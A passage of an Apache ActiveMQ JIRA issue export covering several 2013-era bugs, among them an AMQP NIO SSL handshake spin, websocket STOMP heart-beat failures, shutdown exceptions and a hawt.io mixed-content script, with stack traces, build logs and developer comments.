        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
        ... 33 more
Caused by: javax.net.ssl.SSLException: Received close_notify during handshake
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:208)
        at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1619)
        at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1587)
        at sun.security.ssl.SSLEngineImpl.recvAlert(SSLEngineImpl.java:1732)
        at sun.security.ssl.SSLEngineImpl.readRecord(SSLEngineImpl.java:1060)
        at sun.security.ssl.SSLEngineImpl.readNetRecord(SSLEngineImpl.java:884)
        at sun.security.ssl.SSLEngineImpl.unwrap(SSLEngineImpl.java:758)
        at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:624)
        at org.apache.activemq.transport.nio.NIOSSLTransport.secureRead(NIOSSLTransport.java:304)
        at org.apache.activemq.transport.nio.NIOSSLTransport.doHandshake(NIOSSLTransport.java:333)
        at org.apache.activemq.transport.nio.NIOSSLTransport.initializeStreams(NIOSSLTransport.java:128)
        ... 42 more
{code}

What seems to be happening is that amqp+nio+ssl gets part of the way through the handshake fails and goes into a spin, continuing the spin until the TCP connection is killed from the other side, at which point the client aborts and continues as if nothing had happened.
","java version ""1.7.0_25""
Java(TM) SE Runtime Environment (build 1.7.0_25-b15)
Java HotSpot(TM) 64-Bit Server VM (build 23.25-b01, mixed mode)
",kearls,minfrin,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Oct/13 13:29;kearls;AMQ-4753.patch;https://issues.apache.org/jira/secure/attachment/12606287/AMQ-4753.patch","09/Oct/13 12:31;kearls;AMQ-4753Joram.patch;https://issues.apache.org/jira/secure/attachment/12607547/AMQ-4753Joram.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350936,,,Wed Oct 09 15:13:21 UTC 2013,,,,,,,,,,,"0|i1oiav:",351227,,,,,,,,,,,,,,,,,,,,,"29/Sep/13 14:06;tabish;Did you try a 5.9 SNAPSHOT?  There are many AMQP fixes in there so testing on 5.8 at this point doesn't really tell us if its really an issue any more.  Provide a unit test if you want us to look at it.  ;;;","29/Sep/13 23:44;minfrin;I just tried to build 5.9-SNAPSHOT, but the build is currently broken using a completely fresh repository:

{code}
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Summary:
[INFO] 
[INFO] ActiveMQ .......................................... SUCCESS [16.037s]
[INFO] ActiveMQ :: Openwire Generator .................... SUCCESS [20.278s]
[INFO] ActiveMQ :: Client ................................ SUCCESS [54.251s]
[INFO] ActiveMQ :: Openwire Legacy Support ............... SUCCESS [9.361s]
[INFO] ActiveMQ :: JAAS .................................. SUCCESS [23.332s]
[INFO] ActiveMQ :: Broker ................................ SUCCESS [18.701s]
[INFO] ActiveMQ :: KahaDB Store .......................... SUCCESS [11.139s]
[INFO] ActiveMQ :: STOMP Protocol ........................ SUCCESS [2.583s]
[INFO] ActiveMQ :: MQTT Protocol ......................... SUCCESS [34.112s]
[INFO] ActiveMQ :: JDBC Store ............................ SUCCESS [13.440s]
[INFO] ActiveMQ :: LevelDB Store ......................... SUCCESS [6:16.778s]
[INFO] ActiveMQ :: RA .................................... SUCCESS [28.812s]
[INFO] ActiveMQ :: Pool .................................. SUCCESS [11.768s]
[INFO] ActiveMQ :: Spring ................................ SUCCESS [2:15.342s]
[INFO] ActiveMQ :: AMQP .................................. SUCCESS [31.109s]
[INFO] ActiveMQ :: Console ............................... SUCCESS [13.578s]
[INFO] ActiveMQ :: Unit Tests ............................ SUCCESS [34.303s]
[INFO] ActiveMQ :: Camel ................................. FAILURE [54.012s]
[INFO] ActiveMQ :: HTTP Protocol Support ................. SKIPPED
[INFO] ActiveMQ :: All JAR bundle ........................ SKIPPED
[INFO] ActiveMQ :: File Server ........................... SKIPPED
[INFO] ActiveMQ :: Log4j Appender ........................ SKIPPED
[INFO] ActiveMQ :: Apache Karaf .......................... SKIPPED
[INFO] ActiveMQ :: RAR ................................... SKIPPED
[INFO] ActiveMQ :: Run Jar ............................... SKIPPED
[INFO] ActiveMQ :: Runtime Configuration ................. SKIPPED
[INFO] ActiveMQ :: Tooling ............................... SKIPPED
[INFO] ActiveMQ :: Memory Usage Test Plugin .............. SKIPPED
[INFO] ActiveMQ :: Performance Test Plugin ............... SKIPPED
[INFO] ActiveMQ :: StartUp Plugin ........................ SKIPPED
[INFO] ActiveMQ :: Web ................................... SKIPPED
[INFO] ActiveMQ :: OSGi bundle ........................... SKIPPED
[INFO] ActiveMQ :: Blueprint ............................. SKIPPED
[INFO] ActiveMQ :: Web Demo .............................. SKIPPED
[INFO] ActiveMQ :: Web Console ........................... SKIPPED
[INFO] ActiveMQ :: Karaf Integration Tests ............... SKIPPED
[INFO] ActiveMQ :: Integration Test :: Spring 3.1 ........ SKIPPED
[INFO] ActiveMQ :: Assembly .............................. SKIPPED
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 15:03.987s
[INFO] Finished at: Sun Sep 29 15:39:32 GMT+00:00 2013
[INFO] Final Memory: 98M/235M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal on project activemq-camel: Could not resolve dependencies for project org.apache.activemq:activemq-camel:bundle:5.9-SNAPSHOT: Could not find artifact org.apache.activemq:activemq-unit-tests:jar:tests:5.9-SNAPSHOT in com.fusesource.m2.snapshot (http://repo.fusesource.com/nexus/content/repositories/snapshots/) -> [Help 1]
{code}

It looks like the activemq-unit-tests project is build without a classifier, but the dependency above requires the classifier:

{code}
[minfrin@localhost activemq]$ pushd ~/.m2/repository/org/apache/activemq/activemq-unit-tests/5.9-SNAPSHOT/ 
[minfrin@localhost 5.9-SNAPSHOT]$ ls -al
total 100
drwxrwxr-x 2 minfrin minfrin  4096 Sep 29 16:39 .
drwxrwxr-x 3 minfrin minfrin  4096 Sep 29 15:38 ..
-rw-rw-r-- 1 minfrin minfrin   210 Sep 29 16:38 _maven.repositories
-rw-rw-r-- 1 minfrin minfrin   412 Sep 29 16:39 activemq-unit-tests-5.9-SNAPSHOT-tests.jar.lastUpdated
-rw-rw-r-- 1 minfrin minfrin 17159 Sep 29 16:38 activemq-unit-tests-5.9-SNAPSHOT.jar
-rw-rw-r-- 1 minfrin minfrin 59725 Sep 29 13:23 activemq-unit-tests-5.9-SNAPSHOT.pom
-rw-rw-r-- 1 minfrin minfrin   718 Sep 29 16:38 maven-metadata-local.xml
{code}

It seems the current build is relying on stale SNAPSHOT jars in order to build successfully.
;;;","30/Sep/13 00:24;minfrin;Commenting out the activemq-camel module allows the build to get far enough to build the activemq-amqp module, and this is enough to swap the jar in and test. From this I found that there was no difference in behaviour, NIO still spins at 100% as before.

Looking closer in the code, I am not seeing any kind of clear mechanism to switch from a read to a write, or a write to a read during the handshake, as required by the SSL protocol. I suspect this lack of support is causing the spin as an attempt is made to read when SSL wants us to write instead. I am going to have to get this code up onto a debugger first to see what it is doing in detail.
;;;","02/Oct/13 13:29;kearls;Here's a unit test which should reproduce this.  (Note the test hangs using qpid 0.22, I haven't tried it with 0.24 yet)
;;;","08/Oct/13 20:33;tabish;From a brief glance it looks as though the NIOSSL AMQP Transport is not complete, it appears to be passing a raw ByteBuffer onto the protocol converter before processing it into an AMQPHeader so an IllegalStateException is being thrown. ;;;","08/Oct/13 21:55;tabish;Submitted a patch to the AmqpNIOSSLTransport to get things working a bit better.  There's still no real tests there for this one so wouldn't count on this being a complete fix but it gets past the initial protocol discriminator phase and starts passing down proper Buffers to the protocol converter.  ;;;","09/Oct/13 12:31;kearls;This runs the JoramJmsTests with amqp+nio+ssl
;;;","09/Oct/13 15:13;tabish;Test patch applied with thanks.  Tests are passing.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Default configuration raises an exception at shutdown,AMQ-4748,12671070,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,jbonofre,jbonofre,28/Sep/13 05:24,02/Oct/13 09:55,14/Jul/23 05:43,02/Oct/13 09:55,5.9.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When using the default configuration, starting with bin/activemq console, at broker shutdown (using CTRL-C), an exception (ERROR) is displayed:

ERROR: java.lang.IllegalStateException: Shutdown in progress
java.lang.IllegalStateException: Shutdown in progress
        at java.lang.ApplicationShutdownHooks.remove(ApplicationShutdownHooks.java:82)
        at java.lang.Runtime.removeShutdownHook(Runtime.java:237)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:119)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:262)
        at org.apache.activemq.console.Main.main(Main.java:115)
",,jbonofre,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350899,,,2013-09-28 05:24:24.0,,,,,,,,,,,"0|i1oi2v:",351190,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WARN in hawt.io console,AMQ-4747,12671069,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,jbonofre,jbonofre,28/Sep/13 05:19,30/Sep/13 14:44,14/Jul/23 05:43,30/Sep/13 14:44,5.9.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"When starting the hawt.io console, we see several WARN messages like this:

Ignored: java.io.FileNotFoundException: /home/jbonofre/workspace/activemq/activemq/assembly/target/apache-activemq-5.9-SNAPSHOT/webapps/hawtio/WEB-INF/classes (Is a directory)",,davsclaus,jbonofre,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350898,,,Mon Sep 30 14:44:00 UTC 2013,,,,,,,,,,,"0|i1oi2n:",351189,,,,,,,,,,,,,,,,,,,,,"30/Sep/13 13:55;davsclaus;Its the insight that does a system out;;;","30/Sep/13 13:55;davsclaus;See
https://github.com/jboss-fuse/fuse/issues/95;;;","30/Sep/13 14:25;davsclaus;We will disable the insight-log so we do not have these WARNs;;;","30/Sep/13 14:44;davsclaus;Fixed, by disabling the insight module.

We will enable this module again in a future release when its fixed in insight.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Applet ClassLoader Problems,AMQ-4746,12670976,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,moodycl,moodycl,27/Sep/13 17:21,02/Apr/14 23:57,14/Jul/23 05:43,02/Nov/13 14:21,5.7.0,5.8.0,,,,5.10.0,5.9.1,,JMS client,,,,0,ClassLoader,,,,,,,,"Applets fail to deserailize messages in a timely manner after a network failure triggers a reconnect using the FailoverTransport

In ClassLoadingAwareObjectInputStream.java the  load() method makes a call to Class.forName().

For the primitive types (int, boolean, etc.) this would result in a call similar to:
    Class.forName(""int"", false, loader); //Where loader is the Applet2ClassLoader

Since Applet2ClassLoader is a URLClassLoader and ""int.class"" is not in the jar cache it pulled down from the server at the start of application, it is going to try and go to the server to resolve this class.
In the event of a network failure, this will result in the ClassLoader having to wait for the socket timeout. (see stacktrace at link) Once this socket timeout occurs, the load() method then attempts to lookup the class in the primitive HashMap that is statically initialized. This returns the class for the int and the deserialization continues on.

At first it seemed like the messages were failing to be received but it turned out they were just taking a very long time to be deserialized. This problem can be avoided by changing the order in which ClassLoadingAwareObjectInputStream tries to resolve the class. 

Here is the change I made to the load() method: http://activemq.2283324.n4.nabble.com/Applet-Class-Loader-Problems-td4671835.html 

","Windows 7, Java 1.7 or 1.6, Applet",davsclaus,moodycl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350805,,,Sat Nov 02 14:23:25 UTC 2013,,,,,,,,,,,"0|i1ohhz:",351096,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 14:21;davsclaus;Thanks for reporting and the suggested fix.

I have reworked the loading to load primitives first. And use the same logic as we do in Apache Camel.;;;","02/Nov/13 14:23;davsclaus;Also added a logger. So you can enable TRACE level if you want to see all the attempts of loading.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Qpid producer.send with sync_publish=true set against activemq blocks and doesn't return,AMQ-4741,12670736,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tcollinsworth,tcollinsworth,26/Sep/13 14:12,02/Apr/14 22:10,14/Jul/23 05:43,09/Jan/14 14:29,5.8.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"While producer.send with system property sync_publish=true against activemq block failing to return, the same scenario works fine against Microsoft Azure Service Bus.
This interferes with testing isolated local systems without remote MS ASB integration.
This was not tested against either of the Qpid brokers or the Active MQ 5.9.0 codebase.

See Qpid bug https://issues.apache.org/jira/browse/QPID-5177 for more information.

Gordon Sim commented:
ActiveMQ does send back a disposition with settled=true, but with no state set (e.g. not accepted) which may be the issue?","Qpid 0.22, 0.24, ActiveMQ 5.8.0, Java 7 x64, Ubuntu linux 12.04",gtully,tabish,tcollinsworth,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350565,,,Thu Jan 09 14:33:24 UTC 2014,,,,,,,,,,,"0|i1og1b:",350858,,,,,,,,,,,,,,,,,,,,,"30/Sep/13 14:46;tabish;Suggest you add a JUnit test case to demonstrate the issue, then someone can look into it.  ;;;","08/Jan/14 22:29;tabish;Fixed on trunk, now sets accepted state once Message is received and processed.;;;","09/Jan/14 14:13;gtully;I reverted the addition of  factory.setSyncPublish(syncPublish);[1]
which seems to require a later version of qpid jms client, trunk amqp tests would not compile.

[1] https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=a33a4e76;;;","09/Jan/14 14:14;gtully;@Tim, can you check what I reverted? it seems important to this scenario;;;","09/Jan/14 14:28;tabish;Sorry about that, it's ok to remove that as long as the producer is set to send with DeliveryMode.PERSISTENT.  This simply tests that the test doesn't hang which it shouldn't now since the fix for AMQ-4741 is in.

We should probably think about moving trunk to a 0.26 SNAPSHOT soon as many of the tests are checking that the fixes there are good.  ;;;","09/Jan/14 14:29;tabish;Revert of the sync option set is fine, will work as expected once 0.26 is our default client dependency.  ;;;","09/Jan/14 14:33;gtully;makes sense to move to the .26 snap b/c there are a bunch of failing tests in the amqp module atm.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
heart-beat is disabled when connecting to web socket,AMQ-4740,12670485,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jmesnil,jmesnil,25/Sep/13 13:56,31/Mar/15 21:38,14/Jul/23 05:43,31/Mar/15 21:38,5.10.0,5.8.0,,,,5.10.0,5.9.1,,,,,,6,,,,,,,,,"If I use the stomp.js library to connect to ActiveMQ over its WebSocket url (ws://localhost:61614), the CONNECTED frame returns with disabled heart-beat:

CONNECTED
heart-beat:0,0
session:ID:retsina.local-63633-1380117269290-2:1
server:ActiveMQ/5.8.0
version:1.1

If I connect to its TCP socket (localhost:61613), the CONNECT frame will have heart-beat:

CONNECTED
heart-beat:10000,10000
session:ID:retsina.local-63384-1380115729700-2:12
server:ActiveMQ/5.8.0
version:1.1

In both case, the stomp.js send the same CONNECT frame with heart-beat:

CONNECT
login:user
passcode:password
accept-version:1.1,1.0
heart-beat:10000,10000

Is heart-beat disabled on purpose for Web Socket? Please note that the stomp.js does support heart-beat (using window.setInterval in a Web browser)
",Google Chrome 29.0.1547.76 (Official Build 223446) ,bergamot,chadkelly,gigaclood,jakanapes,jmesnil,jprillaman,pcarman,sebsjo,tabish,tcharl,zhaiyun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5169,,,,,,,,,AMQ-5155,,,,,,,AMQ-5155,,,,,,,,,,,,,"09/Mar/15 12:32;sebsjo;AMQ-4740-EOF.diff;https://issues.apache.org/jira/secure/attachment/12703415/AMQ-4740-EOF.diff","23/Oct/13 09:57;kearls;AMQ-4740.patch;https://issues.apache.org/jira/secure/attachment/12609835/AMQ-4740.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350314,,,Tue Mar 31 21:38:07 UTC 2015,,,,,,,,,,,"0|i1oehr:",350607,Regression,,,,,,,,,,,,,,,,,,,,"30/Sep/13 15:56;tabish;Have you tested with the latest 5.9-SNAPSHOT?  Can you create a unit test to reproduce?  ;;;","23/Oct/13 09:57;kearls;This was failing because StompSocket did not have an InactivityMonitor defined, so I have added an instance of StompInactivityMonitor.

I tested this manually.  We now return the correct heartbeat, and the server will terminate the connection properly.  I did not add an automated test.  We have some old tests which use Selenium that could be extended to test this, but they are currently deactivated.
;;;","23/Oct/13 16:25;tabish;Patch applied, thanks.;;;","03/Apr/14 13:19;jprillaman;I have applied this patch to version 5.9.0 and have also installed a 5.10.0 snapshot. With each version I receive the following error after establishing a connection and heartbeat through stomp.js. This seems to occur after the 'PING' is sent.

---------- stomp.js output
<<< CONNECTED
heart-beat:10000,10000
session:ID:localhost.localdomain-45596-1396530920609-2:2
server:ActiveMQ/5.10-SNAPSHOT
version:1.1

send PING every 10000ms 
check PONG every 10000ms 
<<< PONG 
>>> PING 
did not receive server activity for the last 20005ms 
Whoops! Lost connection to ws://172.16.99.73:61614/stomp 

--------------------- activemq console ---------------
WARN | Transport Connection to: StompSocket_19548821 failed: java.io.IOException
Exception in thread ""ActiveMQ InactivityMonitor Worker"" java.lang.NullPointerException
	at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
	at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)


WARN | Transport Connection to: StompSocket_19548821 failed: java.io.IOException
Exception in thread ""ActiveMQ InactivityMonitor Worker"" java.lang.NullPointerException
	at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
	at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)
;;;","01/May/14 18:19;pcarman;I'm using version 5.9.1.  I still see this issue when I connect to the broker using STOMP over websocket. Output from the console:

WARN | Transport Connection to: StompSocket_5104867 failed: java.io.IOException
Exception in thread ""ActiveMQ InactivityMonitor Worker"" java.lang.NullPointerException
        at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
        at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
;;;","01/May/14 20:53;jakanapes;Seeing the same exception as Paddy.

I'm using the 5.9.1 homebrew version locally, but seeing the same thing on our staging environment.

If I set the heartbeat to 0,0, the browser receives messages, even though it disconnects every 5 minutes and has to reconnect. 

With the heartbeat set to 10000,10000, the browser never receives messages.;;;","02/May/14 12:10;tcharl;Same as Paddy here too with 5.9.1.

Please reopen;;;","25/May/14 18:14;chadkelly;Please reopen this ticket. The bug described above is still present in 5.9.1. I tried both cases, heartbeat set to  0,0 and 10000,10000. Slightly different buggy behaviors, but it still does not work. Please:
1) download 5.9.1
2) bin/activemq console xbean:examples/conf/activemq-demo.xml
3) open two browsers (firefox/chrome) to http://localhost:8161/demo/websocket/index.html
4) type a few messages over a 5 minute period

 WARN | Transport Connection to: StompSocket_1998606381 failed: java.io.IOException
 WARN | Transport Connection to: StompSocket_178709817 failed: java.io.IOException
Exception in thread ""ActiveMQ InactivityMonitor Worker"" java.lang.NullPointerException
        at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
        at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
Exception in thread ""ActiveMQ InactivityMonitor Worker"" java.lang.NullPointerException
        at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
        at org.apache.activemq.transport.AbstractInactivityMonitor$4.run(AbstractInactivityMonitor.java:215)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
;;;","28/May/14 10:16;bergamot;I also already opened a ticket for the above heartbeat bug: AMQ-5155
;;;","11/Jun/14 14:07;jmesnil;Issue is still happening with ActiveMQ 5.10.0.

In the log:

2014-06-11 15:27:59,776 | WARN  | Transport Connection to: StompSocket_1430955985 failed: java.io.IOException | org.apache.activemq.broker.TransportConnection.Transport | qtp542980314-29

The corresponding STOMP frames were:

CONNECT
accept-version:1.1,1.0
heart-beat:20000,60000

CONNECTED
server:ActiveMQ/5.10.0
heart-beat:60000,20000
session:ID:jeff.local-51540-1402496252734-2:1
version:1.1

And the Web Socket client was sending PING frames every 20 seconds.

;;;","09/Mar/15 12:31;sebsjo;The StompSocket IOException seems to still be an issue with ActiveMQ 5.11.1 (and jetty-8.1.17).

I did some further investigations, and it seems like the java.io.IOException is caused by a java.io.EOFException that in its turn is caused by an InputStream being closed (since there is no more data to be read) and this is not handled gracefully. Quickly added a try-catch block for EOFException and it now seems to work. Should probably be handled in a better way though than what is in the attached AMQ-4740-EOF.diff.

This patch does not solve the heart-beat issue though, but by applying the suggested code from Claudio in AMQ-5155 this seems to work fine, at least when testing with stomp.js:
{noformat}
Opening Web Socket...
Web Socket Opened...
>>> CONNECT
login:
passcode:password
accept-version:1.1,1.0
heart-beat:10000,10000

<<< CONNECTED
heart-beat:10000,10000
session:ID:server01-55719-1425899064567-4:58
server:ActiveMQ/5.11.1
version:1.1

connected to server ActiveMQ/5.11.1
send PING every 10000ms
check PONG every 10000ms
connected to Stomp
>>> SUBSCRIBE
id:sub-0
destination:/topic/chat.general

<<< PONG
>>> PING
<<< PONG
>>> PING
<<< PONG
>>> PING
<<< PONG
>>> PING
<<< PONG
>>> PING
<<< PONG
{noformat};;;","31/Mar/15 21:38;tabish;Fixed by AMQ-5155;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
External dependency (Google Maps) in hawtio's console,AMQ-4736,12670245,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,lionel.cons,lionel.cons,24/Sep/13 10:37,28/Sep/13 07:16,14/Jul/23 05:43,28/Sep/13 07:16,,,,,,5.9.0,,,,,,,0,,,,,,,,,"When using hawtio's console through https, the browser complains with:

[blocked] The page at https://foo/bar/#/jmx/charts?nid=root-org.apache.activemq-Broker-foo ran insecure content from http://maps.googleapis.com/maps/api/js?sensor=false.

This comes from an external JS file being used in webapps/hawtio/index.html:

<!-- google maps -->
<script src=""http://maps.googleapis.com/maps/api/js?sensor=false"" type=""text/javascript""></script>

Google Maps can probably be safely removed from ActiveMQ's console...",apache-activemq-5.9-20130919.101342-100,davsclaus,lionel.cons,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,350074,,,Sat Sep 28 07:16:25 UTC 2013,,,,,,,,,,,"0|i1od0n:",350368,,,,,,,,,,,,,,,,,,,,,"28/Sep/13 07:16;davsclaus;Fixed by https://github.com/hawtio/hawtio/pull/574;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TempQueueMemoryTest started failing recently.,AMQ-4731,12669722,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,20/Sep/13 19:51,03/Dec/14 20:36,14/Jul/23 05:43,26/Sep/13 17:03,5.9.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,TempQueueMemoryTest test is failing.  Fails after changes made for AMQ-2327 because of the way the ConcurrentSkipListMap does its sorting and searching and the implementation of ConsumerIdKey.  The key comparison depends on creation time but later removals will always have a later creation time which causes the search for the element to fails most of the time since it will compare greater than even to a key with the same consumer Id.  Result is that items are left in the consumers map causing a memory leak.,,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5474,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,349652,,,Thu Sep 26 17:03:29 UTC 2013,,,,,,,,,,,"0|i1oafr:",349950,,,,,,,,,,,,,,,,,,,,,"26/Sep/13 17:03;tabish;Fixed on 